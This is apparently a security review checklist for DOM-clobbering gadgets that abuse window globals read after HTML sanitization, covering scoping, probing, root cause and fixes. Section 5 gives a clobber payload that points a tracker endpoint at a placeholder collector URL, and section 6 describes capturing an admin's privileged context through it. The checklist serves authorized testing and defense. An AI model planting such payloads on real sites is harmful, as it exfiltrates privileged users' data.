# Post-Sanitize Global Gadget Review Checklist

## Goal

Find data exfiltration or gadget abuse when an app sanitizes user HTML but later reads `window`/`document` globals that attacker markup can clobber.

## 1. Scope Confirmation

- Confirm lab, owned app, in-scope target, or defensive review.
- Record host, widget/render page, and date.
- Do not copy live flags, tokens, or private collector URLs into reusable notes.

Record:

```text
Target:
Render page:
Sanitizer library:
Date:
```

## 2. Map The Render Pipeline

Identify:

```text
where raw HTML is stored
sanitizer used (DOMPurify, custom, none)
insertion sink (innerHTML, shadow DOM, iframe)
scripts that run immediately after insertion
```

Record:

```text
Sanitizer:
Sink:
Post-insert scripts:
```

## 3. Hunt Post-Sanitize Global Reads

Search rendered page JS for patterns like:

```javascript
window.trackerConfig
window.__ctx
window.config
window.settings
document.someGlobal
```

Record each global, what property is read, and what sink uses it:

```text
Global:
Property read:
Sink (Image.src, fetch, postMessage, etc.):
```

## 4. Confirm Sanitizer Allows Clobber Primitives

Test whether these survive sanitization:

```html
<a id="trackerConfig"></a>
<form id="trackerConfig"></form>
<a id="__ctx"></a>
```

Record:

```text
id= allowed: yes/no
form allowed: yes/no
duplicate id behavior in target browser:
```

## 5. Test trackerConfig Endpoint Redirect

Primary probe:

```html
<a id="trackerConfig"></a><a id="trackerConfig" name="endpoint" href="https://[collector]?m=hit"></a>
```

Open widget locally. Check collector or network tab.

Record:

```text
Collector hit on self-visit: yes/no
Request URL:
Query parameter d decoded:
```

## 6. Test Privileged Context Path

If copy mentions admin/reviewer review:

- create widget with clobber payload
- dispatch report/admin review
- wait for second collector hit

Compare:

```text
User visit d= payload:
Admin visit d= payload:
Privileged field present: yes/no
```

## 7. Rule Out False Positives

Document controls:

```text
Plain HTML without clobber → no collector redirect
form+input endpoint clobber → no useful URL string
collector hit only after admin visit → confirms __ctx leak path
```

## 8. Root Cause Checklist

Separate:

```text
XSS in snippet: yes/no
Sanitizer bypass required: yes/no
Global clobber primitive:
Built-in gadget (beacon/analytics):
Privileged data source (__ctx, cookie, DOM):
```

## 9. Fix Checklist

- Remove ambient `window.*` config reads after user HTML mount.
- Hardcode beacon endpoints.
- Keep privileged review context off pages that render user HTML.
- Use module-scoped immutable config objects.
- Add regression tests for `id` clobbering of known global names.

## Decision Checklist

- [ ] Render pipeline and sanitizer identified.
- [ ] Post-sanitize global reads enumerated.
- [ ] Clobber primitives tested against sanitizer output.
- [ ] trackerConfig (or equivalent) redirect confirmed.
- [ ] Admin/reviewer path tested if applicable.
- [ ] Privileged exfil distinguished from empty user context.
- [ ] Root cause documented as global gadget clobbering, not snippet XSS.
- [ ] Reusable notes exclude live secrets.
